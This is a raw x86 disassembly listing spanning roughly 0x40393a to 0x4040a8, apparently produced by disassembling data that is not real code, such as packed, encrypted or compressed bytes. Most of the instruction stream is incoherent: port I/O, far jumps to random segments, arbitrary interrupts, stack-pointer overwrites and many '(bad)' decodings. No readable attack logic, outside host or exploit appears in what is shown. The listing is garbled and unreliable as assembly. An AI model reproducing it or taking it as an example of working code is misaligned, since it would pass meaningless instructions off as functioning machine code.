  40393a:	xchg   ebx,eax
  40393b:	fdivr  QWORD PTR [ecx+eax*2-0x73b50cb1]
  403942:	cmp    esi,ebp
  403944:	push   ebp
  403945:	mov    esp,0x7056af4c
  40394a:	xchg   esi,eax
  40394b:	loopne 0x403992
  40394d:	push   es
  40394e:	fldl2t 
  403950:	xchg   DWORD PTR [edi-0x18],esi
  403953:	cmp    DWORD PTR [ecx],ecx
  403955:	sub    eax,0x1c1e2927
  40395a:	imul   eax,DWORD PTR [eax],0xffffffff
  40395d:	shl    ecx,cl
  40395f:	xchg   ebp,eax
  403960:	xor    eax,0x5db87a97
  403965:	out    dx,al
  403966:	lods   al,BYTE PTR ds:[esi]
  403967:	idiv   ch
  403969:	ret    
  40396a:	push   0xffffffad
  40396c:	not    BYTE PTR ds:0xfd0b40c5
  403972:	stos   DWORD PTR es:[edi],eax
  403973:	push   0xa84acac
  403978:	cmc    
  403979:	jg     0x403978
  40397b:	cmp    BYTE PTR [ecx+0x31],0x9e
  40397f:	shl    BYTE PTR [ecx-0x6a75e56b],cl
  403985:	push   ebx
  403986:	fdiv   QWORD PTR [ecx]
  403988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403989:	mov    dh,0x98
  40398b:	or     cl,BYTE PTR [ebx+0x42e7ed09]
  403991:	or     edx,ecx
  403993:	xchg   esp,eax
  403994:	scas   eax,DWORD PTR es:[edi]
  403995:	pushf  
  403996:	pop    ebp
  403997:	xor    edx,DWORD PTR [ecx-0x10]
  40399a:	test   BYTE PTR ds:0xab7c2380,cl
  4039a0:	mov    cl,0x8c
  4039a2:	cmp    DWORD PTR [edx-0x5],ecx
  4039a5:	shl    BYTE PTR [ebx+0x2c],0xac
  4039a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039aa:	pop    ebx
  4039ab:	or     edi,ecx
  4039ad:	adc    eax,0x5f225eb0
  4039b2:	sti    
  4039b3:	loop   0x4039c0
  4039b5:	repz or ah,BYTE PTR [ebx-0x3c29ae83]
  4039bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039bd:	jae    0x40395b
  4039bf:	les    esp,FWORD PTR [esi-0x37b28a24]
  4039c5:	xor    DWORD PTR [edx-0x41a2ef4d],edx
  4039cb:	int    0x33
  4039cd:	mov    BYTE PTR [ebx+0x7f],bh
  4039d0:	call   DWORD PTR [edi]
  4039d2:	or     al,0x14
  4039d4:	fs push cs
  4039d6:	xor    esp,DWORD PTR [edi+edx*2+0x421b6e0b]
  4039dd:	ins    BYTE PTR es:[edi],dx
  4039de:	lods   eax,DWORD PTR ds:[esi]
  4039df:	neg    edx
  4039e1:	sub    BYTE PTR [eax+0x55],dh
  4039e4:	aas    
  4039e5:	mov    eax,esi
  4039e7:	jbe    0x403a0f
  4039e9:	out    dx,al
  4039ea:	pop    edx
  4039eb:	xor    bh,BYTE PTR [edx+0x42aeec2]
  4039f1:	jge    0x403a1f
  4039f3:	ins    DWORD PTR es:[edi],dx
  4039f4:	xchg   edx,eax
  4039f5:	push   ds
  4039f6:	retf   0x4d6a
  4039f9:	and    ch,BYTE PTR [edi-0x342979d7]
  4039ff:	pop    DWORD PTR [bx+di-0x35]
  403a03:	mov    al,ds:0xd5d3aec7
  403a08:	mov    WORD PTR [esi+0x1e],fs
  403a0b:	cmp    eax,DWORD PTR [edx+0x47]
  403a0e:	pop    edx
  403a0f:	sub    ebp,DWORD PTR [edx-0x10]
  403a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a13:	ror    edi,1
  403a15:	inc    eax
  403a16:	push   esi
  403a17:	xchg   ebp,eax
  403a18:	mov    esp,0x8c9bc6ae
  403a1d:	ficomp DWORD PTR [eax]
  403a1f:	out    0x1f,eax
  403a21:	cdq    
  403a22:	mov    edx,0x789ab925
  403a27:	inc    edi
  403a28:	or     bl,bl
  403a2a:	mov    eax,ds:0x658166b8
  403a2f:	xor    ecx,ebp
  403a31:	jb     0x403a54
  403a33:	jnp    0x403a65
  403a35:	outs   dx,DWORD PTR ds:[esi]
  403a36:	into   
  403a37:	push   cs
  403a38:	ret    
  403a39:	push   es
  403a3a:	sbb    BYTE PTR [eax+0x31bdc10b],ah
  403a40:	cmp    al,0x35
  403a42:	shl    al,0xf5
  403a45:	out    0x22,eax
  403a47:	push   ds
  403a48:	dec    edi
  403a49:	sub    al,0xda
  403a4b:	std    
  403a4c:	pop    gs
  403a4e:	fwait
  403a4f:	sbb    al,0xbf
  403a51:	fmul   DWORD PTR [ecx]
  403a53:	pop    ecx
  403a54:	ins    DWORD PTR es:[edi],dx
  403a55:	jbe    0x403a2a
  403a57:	and    BYTE PTR [ebp-0x45],ch
  403a5a:	outs   dx,BYTE PTR ds:[esi]
  403a5b:	push   ebx
  403a5c:	push   esp
  403a5d:	in     eax,dx
  403a5e:	inc    dh
  403a60:	nop
  403a61:	or     esp,DWORD PTR [ebp+0x5c]
  403a64:	mov    ebp,0x5861602d
  403a69:	add    al,0x4a
  403a6b:	dec    esi
  403a6c:	(bad)  
  403a6d:	fsubr  QWORD PTR [edx]
  403a6f:	es and al,0x29
  403a72:	inc    ecx
  403a73:	repz retf 0xa28e
  403a77:	xchg   edi,eax
  403a78:	or     ch,BYTE PTR [ebx]
  403a7a:	or     BYTE PTR gs:[esi+0x7],dh
  403a7e:	push   ecx
  403a7f:	retf   
  403a80:	xchg   edx,eax
  403a81:	sub    eax,0xc94d49c6
  403a86:	mov    DWORD PTR [esi-0x6],edx
  403a89:	ins    BYTE PTR es:[edi],dx
  403a8a:	iret   
  403a8b:	pushf  
  403a8c:	dec    BYTE PTR [esi-0x6bb46be8]
  403a92:	pop    ss
  403a93:	cwde   
  403a94:	cmp    al,0x8e
  403a96:	outs   dx,DWORD PTR ds:[esi]
  403a97:	ret    
  403a98:	xchg   esp,eax
  403a99:	cmp    DWORD PTR [ebp+0x5805fb74],0x4
  403aa0:	mov    al,0x4
  403aa2:	push   edi
  403aa3:	cs dec ecx
  403aa5:	and    al,0x1b
  403aa7:	out    dx,eax
  403aa8:	icebp  
  403aa9:	cmp    bl,BYTE PTR [edx]
  403aab:	sbb    DWORD PTR ds:0xd5b10a88,esi
  403ab1:	ss xchg esp,eax
  403ab3:	cmp    eax,0x44fedc0
  403ab8:	mov    WORD PTR [esi-0x6a],?
  403abb:	mov    ch,0x17
  403abd:	aad    0x9a
  403abf:	jle    0x403b05
  403ac1:	xchg   ecx,eax
  403ac2:	add    ebp,ecx
  403ac4:	js     0x403b36
  403ac6:	call   0x8ff5:0xc67428e3
  403acd:	pop    eax
  403ace:	mov    esp,DWORD PTR [edx+0x19]
  403ad1:	cmc    
  403ad2:	(bad)  
  403ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ad4:	loope  0x403abc
  403ad6:	xor    bl,BYTE PTR [esi+edi*1-0x784203c0]
  403add:	xor    al,0x50
  403adf:	pcmpgtb mm7,QWORD PTR [esi+0x4e3f940e]
  403ae6:	stos   DWORD PTR es:[edi],eax
  403ae7:	popf   
  403ae8:	pop    edx
  403ae9:	and    eax,0x5e7cbb72
  403aee:	mov    esi,0xc80a5e26
  403af3:	cmp    al,0x55
  403af5:	dec    eax
  403af6:	xchg   edi,eax
  403af7:	sub    DWORD PTR [eax],0xffffff9b
  403afa:	mov    ch,0xbf
  403afc:	sbb    DWORD PTR [edx],ebx
  403afe:	and    al,0xa2
  403b00:	sub    dh,ah
  403b02:	sbb    bh,BYTE PTR [esi+0x71]
  403b05:	loope  0x403a8c
  403b07:	xchg   edx,ebp
  403b09:	cmc    
  403b0a:	movlps QWORD PTR [eax+0x37],xmm1
  403b0e:	inc    ecx
  403b0f:	out    dx,al
  403b10:	stos   DWORD PTR es:[edi],eax
  403b11:	mov    BYTE PTR [ebx],al
  403b13:	lahf   
  403b14:	xchg   DWORD PTR [edx-0x36d0b9ee],eax
  403b1a:	lods   eax,DWORD PTR ds:[esi]
  403b1b:	push   0x1d
  403b1d:	iret   
  403b1e:	sub    DWORD PTR [ecx],ebx
  403b20:	iret   
  403b21:	inc    ebx
  403b22:	scas   eax,DWORD PTR es:[edi]
  403b23:	loop   0x403ae8
  403b25:	out    0xd5,eax
  403b27:	sbb    BYTE PTR [edi-0x4c],al
  403b2a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  403b2c:	jg     0x403afd
  403b2e:	bound  ecx,QWORD PTR [edx]
  403b30:	push   ebx
  403b31:	test   eax,0xa9a559e6
  403b36:	test   al,0x80
  403b38:	(bad)  
  403b3a:	ror    DWORD PTR [ecx+0x1fb7ca5d],1
  403b40:	je     0x403b77
  403b42:	cmp    DWORD PTR [eax+0x12],0x1f
  403b46:	pop    DWORD PTR [edi-0x32]
  403b49:	fdivr  DWORD PTR ds:0xde1b4800
  403b4f:	lds    ebx,FWORD PTR [ebx]
  403b51:	(bad)  
  403b52:	jl     0x403b9b
  403b54:	out    0xbd,al
  403b56:	out    dx,al
  403b57:	push   0x2a985ca
  403b5c:	je     0x403b4d
  403b5e:	push   esp
  403b5f:	sahf   
  403b60:	int    0xc9
  403b62:	and    ch,BYTE PTR [ebx+0x30c52cdf]
  403b68:	rol    cl,cl
  403b6a:	or     ch,BYTE PTR [eax-0x36]
  403b6d:	test   BYTE PTR [esi],ch
  403b6f:	inc    ebx
  403b70:	xchg   esp,eax
  403b71:	pop    ss
  403b72:	sub    BYTE PTR [ebp-0xd],bh
  403b75:	dec    ebx
  403b76:	cli    
  403b77:	cli    
  403b78:	pop    ebp
  403b79:	sub    eax,0xe72b9110
  403b7e:	(bad)  
  403b7f:	hlt    
  403b80:	test   BYTE PTR [edi],cl
  403b82:	lods   al,BYTE PTR ds:[esi]
  403b83:	sub    eax,DWORD PTR ds:0x346c9f13
  403b89:	adc    al,0x38
  403b8b:	out    0xfc,al
  403b8d:	pop    ss
  403b8e:	adc    bl,ch
  403b90:	xlat   BYTE PTR ds:[ebx]
  403b91:	inc    DWORD PTR [ecx]
  403b93:	shl    edx,cl
  403b95:	jo     0x403b6e
  403b97:	jmp    0x54915170
  403b9c:	iret   
  403b9d:	sub    eax,0x1d9d2f04
  403ba2:	test   ch,0x97
  403ba5:	nop
  403ba6:	and    DWORD PTR [edx+0x43],ecx
  403ba9:	push   eax
  403baa:	cmp    al,0x7b
  403bac:	ret    
  403bad:	xchg   edx,eax
  403bae:	mov    eax,?
  403bb0:	fild   DWORD PTR ds:0xe4e357dc
  403bb6:	mov    bh,0xee
  403bb8:	sbb    al,0x63
  403bba:	mov    bh,0x49
  403bbc:	out    0xad,al
  403bbe:	(bad)  
  403bbf:	sub    ecx,DWORD PTR [ebx-0x66]
  403bc2:	dec    edi
  403bc3:	int3   
  403bc4:	mov    esi,0x4841aeab
  403bc9:	shl    DWORD PTR [ebx],1
  403bcb:	and    DWORD PTR [eax],eax
  403bcd:	push   ecx
  403bce:	mov    esp,0xff6e3106
  403bd3:	outs   dx,DWORD PTR ds:[esi]
  403bd4:	cmp    eax,DWORD PTR [eax]
  403bd6:	jmp    0x120:0xec95c614
  403bdd:	cmp    al,0x70
  403bdf:	fist   WORD PTR [ecx+0x7adafa2]
  403be5:	lods   eax,DWORD PTR ds:[esi]
  403be6:	aaa    
  403be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403be8:	mov    ecx,0xc57db26d
  403bed:	ror    esi,cl
  403bef:	sub    eax,esi
  403bf1:	popa   
  403bf2:	jmp    0x403c43
  403bf4:	ins    DWORD PTR es:[edi],dx
  403bf5:	jne    0x403c14
  403bf7:	data16 jo 0x403c68
  403bfa:	or     al,0xf
  403bfc:	popf   
  403bfd:	gs xchg esi,eax
  403bff:	fistp  DWORD PTR [edx-0x2e]
  403c02:	test   DWORD PTR [edx+ecx*4],edi
  403c05:	dec    ebp
  403c06:	int    0xca
  403c08:	cmp    edx,edi
  403c0a:	mov    ds:0x29c3d6f6,eax
  403c0f:	jno    0x403c83
  403c11:	adc    eax,0x82f8d590
  403c16:	(bad)  
  403c18:	xor    DWORD PTR [edi-0x4d],ecx
  403c1b:	cmp    eax,0x590a415
  403c20:	and    dl,al
  403c22:	(bad)  
  403c23:	leave  
  403c24:	sub    dh,ch
  403c26:	shl    BYTE PTR [eax],cl
  403c28:	shl    BYTE PTR [ebp-0xd],1
  403c2b:	pop    esi
  403c2c:	lods   al,BYTE PTR ds:[esi]
  403c2d:	cwde   
  403c2e:	lea    ecx,[ebx+edi*1-0xdb6654e]
  403c35:	in     eax,0x7d
  403c37:	aaa    
  403c38:	push   es
  403c39:	sbb    ebp,DWORD PTR [esi]
  403c3b:	arpl   WORD PTR [esi-0x41c4a724],bx
  403c41:	jno    0x403bef
  403c43:	mov    al,ds:0x6cbce8c7
  403c48:	xor    DWORD PTR [esi],esi
  403c4a:	mov    eax,ds:0x19b508f5
  403c4f:	xchg   esp,eax
  403c50:	jle    0x403c3c
  403c52:	fnstsw WORD PTR [ebx+0x2693cb33]
  403c58:	pop    esp
  403c59:	std    
  403c5a:	mov    edx,0x56d5b4eb
  403c60:	pushf  
  403c61:	and    eax,0x25757eeb
  403c66:	dec    ebp
  403c67:	imul   ch
  403c69:	mov    esi,0xb5bce12
  403c6e:	inc    esp
  403c6f:	adc    BYTE PTR [esi+0x145f1e84],dl
  403c75:	sub    cl,BYTE PTR [esi]
  403c77:	stos   DWORD PTR es:[edi],eax
  403c78:	js     0x403cd4
  403c7a:	rcr    BYTE PTR [esi+0x39],cl
  403c7d:	jg     0x403cb4
  403c7f:	ins    BYTE PTR es:[edi],dx
  403c80:	or     eax,0xf3bdf63d
  403c85:	xchg   esp,eax
  403c86:	xor    eax,0xb2a413bf
  403c8b:	sub    dh,bl
  403c8d:	fidivr WORD PTR [edx+ebx*2-0x29]
  403c91:	cwde   
  403c92:	loop   0x403c39
  403c94:	ins    BYTE PTR es:[edi],dx
  403c95:	stos   DWORD PTR es:[edi],eax
  403c96:	jno    0x403cc8
  403c98:	lods   eax,DWORD PTR ds:[esi]
  403c99:	icebp  
  403c9a:	(bad)  
  403c9c:	add    DWORD PTR [ebp-0x1bcdadcc],ebp
  403ca2:	pop    ebp
  403ca3:	rol    DWORD PTR [edi-0x65],0xbd
  403ca7:	popf   
  403ca8:	call   0x5c67:0x8969f149
  403caf:	fdivr  QWORD PTR [esp+eiz*2]
  403cb2:	add    al,0x81
  403cb4:	loop   0x403cbd
  403cb6:	not    DWORD PTR [ebx+esi*1-0x17]
  403cba:	jae    0x403d17
  403cbc:	adc    bl,ch
  403cbe:	fwait
  403cbf:	test   al,0x90
  403cc1:	and    ah,bh
  403cc3:	(bad)  
  403cc4:	ja     0x403c5f
  403cc6:	into   
  403cc7:	cmp    eax,0xdd60c1f4
  403ccc:	push   edi
  403ccd:	pop    edx
  403cce:	jbe    0x403cf0
  403cd0:	ins    DWORD PTR es:[edi],dx
  403cd1:	mov    dl,0x92
  403cd3:	xlat   BYTE PTR ds:[ebx]
  403cd4:	mov    al,BYTE PTR [esi+esi*4-0x44]
  403cd8:	loope  0x403c60
  403cda:	xor    al,0x7e
  403cdc:	out    0xce,al
  403cde:	pop    es
  403cdf:	sbb    al,0x7
  403ce1:	push   ebx
  403ce2:	and    ecx,DWORD PTR [ecx]
  403ce4:	ja     0x403d38
  403ce6:	rcl    DWORD PTR [eax+0x21],1
  403ce9:	mov    ebx,0x9f592c66
  403cee:	rcr    dl,0xcc
  403cf1:	pop    eax
  403cf2:	push   0xbd7ed9b
  403cf7:	fsubr  st,st(0)
  403cf9:	stos   DWORD PTR es:[edi],eax
  403cfa:	das    
  403cfb:	push   0x2d
  403cfd:	adc    cl,BYTE PTR [esi+0x2cb920c8]
  403d03:	nop
  403d04:	gs mov bh,0x45
  403d07:	push   cs
  403d08:	shr    cl,1
  403d0a:	(bad)  
  403d0b:	aam    0xd8
  403d0d:	mov    dh,0x1a
  403d0f:	and    al,0x77
  403d11:	test   BYTE PTR [ecx+0x56],0x5a
  403d15:	mov    DWORD PTR [eax+eiz*8],esp
  403d18:	hlt    
  403d19:	cwde   
  403d1a:	jo     0x403d8c
  403d1c:	cmp    eax,DWORD PTR [esi-0x28]
  403d1f:	enter  0xc3ef,0x3b
  403d23:	gs sbb bl,ah
  403d26:	dec    ebp
  403d27:	add    eax,0xe19d2ab1
  403d2c:	out    dx,eax
  403d2d:	xchg   ebp,eax
  403d2e:	test   DWORD PTR [edi-0x61],esi
  403d31:	fistp  DWORD PTR [ebx]
  403d33:	les    edi,FWORD PTR [edi]
  403d35:	add    ah,al
  403d37:	popa   
  403d38:	mov    ds:0xdc3764c3,al
  403d3d:	mov    ecx,0xc1b1a5c7
  403d42:	push   cs
  403d43:	jle    0x403d37
  403d45:	enter  0xa52e,0xa9
  403d49:	daa    
  403d4a:	pop    esp
  403d4b:	mov    ds:0x1be1d0f3,al
  403d50:	js     0x403d6a
  403d52:	or     al,0xe4
  403d54:	dec    edx
  403d55:	mov    edi,DWORD PTR [eax]
  403d57:	mov    es,WORD PTR [ebx]
  403d59:	fcmovnb st,st(0)
  403d5b:	adc    al,0xba
  403d5d:	fld    DWORD PTR [ecx-0x530c121]
  403d63:	sub    eax,0xef888b6a
  403d68:	push   eax
  403d69:	mov    ebp,0xcc915544
  403d6e:	and    BYTE PTR [edi],dl
  403d70:	or     ah,BYTE PTR ds:0x5ae1c4d6
  403d76:	retf   0x9f84
  403d79:	xchg   edi,eax
  403d7a:	call   0x2f4be458
  403d7f:	fstp   st(4)
  403d81:	retf   0x2d6c
  403d84:	push   eax
  403d85:	pop    esp
  403d86:	cmp    DWORD PTR [ebx-0x34ff07e6],ebx
  403d8c:	inc    esp
  403d8d:	add    ecx,DWORD PTR [ecx-0x5]
  403d90:	fcomp  DWORD PTR [esi]
  403d92:	scas   al,BYTE PTR es:[edi]
  403d93:	mov    bh,BYTE PTR [ecx-0x6d]
  403d96:	lahf   
  403d97:	jmp    0x818a:0xeb60a1ca
  403d9e:	pop    esp
  403d9f:	lock push ds
  403da1:	icebp  
  403da2:	loop   0x403d9b
  403da4:	mov    ebx,0x6078fb27
  403da9:	dec    eax
  403daa:	(bad)  
  403dab:	xchg   ebp,eax
  403dac:	iret   
  403dad:	int3   
  403dae:	int    0x66
  403db0:	ins    BYTE PTR es:[edi],dx
  403db1:	(bad)  
  403db2:	clc    
  403db3:	sbb    BYTE PTR [ebx+0x6c],dl
  403db6:	sti    
  403db7:	mov    esi,0xbd2a4980
  403dbc:	push   edi
  403dbd:	push   ds
  403dbe:	mov    BYTE PTR [eax+eiz*1],dl
  403dc1:	mov    esi,gs
  403dc3:	dec    cl
  403dc5:	lods   al,BYTE PTR ds:[esi]
  403dc6:	and    eax,0x8b83e499
  403dcb:	push   es
  403dcc:	pop    ebp
  403dcd:	ror    DWORD PTR [esi+0x786cc61f],1
  403dd3:	mov    edi,0xb4bab5e8
  403dd8:	mov    cl,0x6
  403dda:	mov    al,ds:0x7be16cc0
  403ddf:	test   eax,0x5d2b7d3e
  403de4:	stc    
  403de5:	xchg   ebp,eax
  403de6:	and    edi,DWORD PTR [edi+0x2e]
  403de9:	loopne 0x403e15
  403deb:	sbb    al,BYTE PTR [eax]
  403ded:	jne    0x403dfa
  403def:	cld    
  403df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403df1:	mov    edx,0xb6086caa
  403df6:	(bad)  
  403df7:	push   0xedca4c7b
  403dfc:	or     bh,0x2
  403dff:	jg     0x403e2d
  403e01:	call   DWORD PTR [ebx-0x7f]
  403e04:	sub    ah,0x91
  403e07:	add    al,0x5e
  403e09:	add    ebx,esi
  403e0b:	inc    ecx
  403e0c:	out    dx,al
  403e0d:	stos   DWORD PTR es:[edi],eax
  403e0e:	jmp    0xb1a9e406
  403e13:	loope  0x403e49
  403e15:	out    0x2c,al
  403e17:	jecxz  0x403e8b
  403e19:	inc    ecx
  403e1a:	xor    BYTE PTR cs:[esi+esi*8-0x29],dl
  403e1f:	icebp  
  403e20:	call   0xbe65205a
  403e25:	shr    ebx,0xe0
  403e28:	mov    al,0x7e
  403e2a:	inc    ebp
  403e2b:	fs push 0x9368d44e
  403e31:	inc    eax
  403e32:	int    0xd9
  403e34:	push   esi
  403e35:	int    0xc
  403e37:	mov    cs,WORD PTR [edi-0x21]
  403e3a:	mov    es,esi
  403e3c:	mov    esi,0x7504bd53
  403e41:	mov    edi,DWORD PTR [edi-0x49]
  403e44:	cmc    
  403e45:	in     eax,dx
  403e46:	inc    edi
  403e47:	or     esp,DWORD PTR [ebp-0xb]
  403e4a:	pop    es
  403e4b:	mov    eax,ds:0xfe81eb3b
  403e50:	sbb    eax,0x7311a08
  403e55:	sbb    ah,BYTE PTR [ecx]
  403e57:	xlat   BYTE PTR cs:[ebx]
  403e59:	loopne 0x403eb9
  403e5b:	cmp    eax,0x5717a856
  403e60:	mov    BYTE PTR [esi+0x1d],bh
  403e63:	sbb    eax,0xb8f57917
  403e68:	add    BYTE PTR [esi+0x41],al
  403e6b:	adc    al,0x95
  403e6d:	cmp    eax,0xdb4b96f2
  403e72:	sbb    eax,DWORD PTR [edx]
  403e74:	imul   edi,esp,0xffffffb4
  403e77:	repz adc esi,DWORD PTR [eax+0x65]
  403e7b:	popa   
  403e7c:	lods   al,BYTE PTR ds:[esi]
  403e7d:	popa   
  403e7e:	add    DWORD PTR [esp+ecx*8+0x612160d4],esi
  403e85:	popf   
  403e86:	pusha  
  403e87:	and    ah,bh
  403e89:	dec    esi
  403e8a:	sub    al,BYTE PTR [eax+eiz*2]
  403e8d:	dec    eax
  403e8e:	jb     0x403ea8
  403e90:	inc    eax
  403e91:	and    BYTE PTR [esi-0x44ec030f],ch
  403e97:	addr16 mov dh,0x87
  403e9a:	sti    
  403e9b:	push   ecx
  403e9c:	sbb    ebx,ecx
  403e9e:	ss adc bh,al
  403ea1:	cld    
  403ea2:	add    al,0x86
  403ea4:	or     al,0x2b
  403ea6:	add    dh,BYTE PTR [esi+0xb879adb]
  403eac:	pop    ebx
  403ead:	fwait
  403eae:	(bad)  
  403eaf:	push   ss
  403eb0:	jnp    0x403ea0
  403eb2:	xor    DWORD PTR [ebx+ebp*2],ecx
  403eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eb6:	and    al,0x7
  403eb8:	int3   
  403eb9:	ret    
  403eba:	or     ebp,esp
  403ebc:	or     eax,DWORD PTR [edx+0x617bbeb]
  403ec2:	jp     0x403f0e
  403ec4:	cmp    BYTE PTR [edx],al
  403ec6:	cmp    eax,edx
  403ec8:	(bad)  
  403ec9:	sbb    esi,ebx
  403ecb:	dec    ebx
  403ecc:	jmp    0xe869:0x47f5b215
  403ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ed4:	or     DWORD PTR [edi+0x25],ecx
  403ed7:	mov    ds:0xcdc81a44,al
  403edc:	lahf   
  403edd:	and    ch,BYTE PTR [eax-0x64bfa473]
  403ee3:	hlt    
  403ee4:	outs   dx,DWORD PTR ds:[esi]
  403ee5:	test   BYTE PTR [edi],ah
  403ee7:	cmp    BYTE PTR ds:[ebx+0x75],bl
  403eeb:	fs adc esp,eax
  403eee:	sbb    BYTE PTR [eax-0x66cbeb9f],bh
  403ef4:	sub    eax,0x6aefe6ae
  403ef9:	cli    
  403efa:	dec    edx
  403efb:	outs   dx,DWORD PTR ds:[esi]
  403efc:	aad    0x47
  403efe:	and    dh,BYTE PTR [ebx+0x36]
  403f01:	gs mov ebx,0x6d0b4a73
  403f07:	cmp    BYTE PTR [ebp-0x21],dh
  403f0a:	push   0xe48be5ea
  403f0f:	inc    esi
  403f10:	add    al,0x95
  403f12:	dec    eax
  403f13:	pusha  
  403f14:	sbb    eax,DWORD PTR [ecx+0x2eb121d0]
  403f1a:	inc    ebx
  403f1b:	push   cs
  403f1c:	add    BYTE PTR [edx+0x22],cl
  403f1f:	in     al,0x8a
  403f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f22:	ss xchg ebx,eax
  403f24:	jnp    0x403f8c
  403f26:	xchg   BYTE PTR [edi+ebp*1+0x77acd628],bl
  403f2d:	test   edx,ebx
  403f2f:	pop    ebx
  403f30:	xchg   dh,al
  403f32:	adc    DWORD PTR [edi-0x25],esp
  403f35:	sar    DWORD PTR [edx+0x27c24ce6],0x46
  403f3c:	enter  0xbe09,0x60
  403f40:	and    DWORD PTR [ebp-0x16],ebp
  403f43:	mov    eax,0xf6717b99
  403f48:	push   ecx
  403f49:	add    esi,DWORD PTR [ecx+eiz*2+0x54]
  403f4d:	pop    ss
  403f4e:	dec    ebp
  403f4f:	sub    DWORD PTR [edx],ebp
  403f51:	cmp    eax,0xcdbfa970
  403f56:	scas   al,BYTE PTR es:[edi]
  403f57:	dec    edi
  403f58:	inc    ebp
  403f59:	add    al,0xe7
  403f5b:	lahf   
  403f5c:	sbb    al,BYTE PTR [eax]
  403f5e:	scas   eax,DWORD PTR es:[edi]
  403f5f:	js     0x403f18
  403f61:	mov    ah,0x15
  403f63:	aam    0x78
  403f65:	or     BYTE PTR [ebx+ebp*2+0x18],ah
  403f69:	xor    dl,BYTE PTR [edx-0x49]
  403f6c:	inc    ecx
  403f6d:	and    ch,bl
  403f6f:	or     ecx,DWORD PTR [edx+0x31d3bf5a]
  403f75:	nop
  403f76:	push   0x3bd3cceb
  403f7b:	adc    bl,BYTE PTR [ebx-0x7cfe8cdb]
  403f81:	xchg   ebx,eax
  403f82:	pop    ebx
  403f83:	inc    edi
  403f84:	call   0x778d82dc
  403f89:	pop    edx
  403f8a:	retfw  
  403f8c:	jmp    edx
  403f8e:	push   DWORD PTR [ebp+eiz*1+0x6a034472]
  403f95:	aam    0xa2
  403f97:	inc    esi
  403f98:	cmp    BYTE PTR cs:[esi-0x7dbe050a],bh
  403f9f:	or     edx,ebx
  403fa1:	pop    ecx
  403fa2:	xchg   edi,eax
  403fa3:	jo     0x403f5b
  403fa5:	jg     0x403f7e
  403fa7:	fist   DWORD PTR [ecx]
  403fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403faa:	and    BYTE PTR [edi],0xd0
  403fad:	nop
  403fae:	add    DWORD PTR [ebp-0x38],0x69
  403fb2:	jne    0x40402d
  403fb4:	adc    ebx,DWORD PTR ds:0xe804300b
  403fba:	or     al,BYTE PTR [esi-0x34f50618]
  403fc0:	fmul   QWORD PTR [ecx+0x52645cd]
  403fc6:	cmc    
  403fc7:	sti    
  403fc8:	sbb    al,0x1c
  403fca:	cmc    
  403fcb:	iret   
  403fcc:	in     al,dx
  403fcd:	mov    BYTE PTR [edx-0x54e78b10],0xb3
  403fd4:	push   0x3f
  403fd6:	ret    0xf3ae
  403fd9:	(bad)  
  403fda:	jns    0x403f8c
  403fdc:	dec    ebp
  403fdd:	mov    al,0x7d
  403fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fe0:	push   ds
  403fe1:	mov    ch,0xc5
  403fe3:	mov    ebp,0x3bb32a6a
  403fe8:	jmp    0xaf8ff3b6
  403fed:	stc    
  403fee:	out    0x32,al
  403ff0:	sbb    eax,0xb34efe80
  403ff5:	push   ds
  403ff6:	inc    eax
  403ff7:	jg     0x403fef
  403ff9:	xchg   ebx,eax
  403ffa:	cdq    
  403ffb:	mov    al,0xc3
  403ffd:	shr    DWORD PTR [edi+edx*2-0x46],1
  404001:	jmp    0x40403f
  404003:	push   0x2a
  404005:	lock enter 0x5635,0xed
  40400a:	mov    bh,0xc
  40400c:	jae    0x404021
  40400e:	sub    al,0x9d
  404010:	add    bl,BYTE PTR [ecx]
  404012:	cs mov dh,0xd9
  404015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404016:	aam    0xb1
  404018:	push   esi
  404019:	or     esi,DWORD PTR [esi]
  40401b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40401c:	cld    
  40401d:	in     eax,0x4a
  40401f:	inc    BYTE PTR [ebp+0x12f5413c]
  404025:	adc    DWORD PTR [ebp+0x60],edi
  404028:	in     eax,dx
  404029:	ret    0x1afe
  40402c:	adc    ah,BYTE PTR [esp+esi*4]
  40402f:	fsubrp st(2),st
  404031:	fnstsw WORD PTR [eax+0x218f1a4d]
  404037:	sbb    DWORD PTR [esi+eax*4],0x5189cec8
  40403e:	mov    bl,0x46
  404040:	mov    ah,0x8a
  404042:	mov    esp,0x742ff112
  404047:	fldenv ds:0x2d39e838
  40404d:	mov    ch,0x4e
  40404f:	nop
  404050:	xchg   ecx,eax
  404051:	imul   esp,ebp,0x1f6357
  404057:	sub    eax,0x32a16e2f
  40405c:	stc    
  40405d:	sub    ecx,DWORD PTR [esi+eax*2-0x6a]
  404061:	les    ebp,FWORD PTR [edx-0x30]
  404064:	pop    ds
  404065:	mov    BYTE PTR [ecx+eax*2-0x74cd7f6f],bh
  40406c:	mov    esp,0x2f7c7376
  404071:	or     al,0x55
  404073:	inc    edx
  404074:	and    bh,bl
  404076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404077:	adc    DWORD PTR [edi-0x5195c81f],edx
  40407d:	jnp    0x404045
  40407f:	xor    BYTE PTR [esi-0x2686e158],ch
  404085:	loopne 0x4040bb
  404087:	mov    bh,0x20
  404089:	mov    ebx,0x84d21d25
  40408e:	pop    ecx
  40408f:	(bad)  
  404090:	icebp  
  404091:	retf   0x5971
  404094:	out    dx,eax
  404095:	lods   eax,DWORD PTR ds:[esi]
  404096:	hlt    
  404097:	out    dx,eax
  404098:	imul   ebx,DWORD PTR [edx-0x8092a7b],0xffffffb0
  40409f:	sar    esi,1
  4040a1:	mov    ah,0xd7
  4040a3:	xchg   edx,eax
  4040a4:	jb     0x404031
  4040a6:	jnp    0x404092
  4040a8:	jge    0x404080
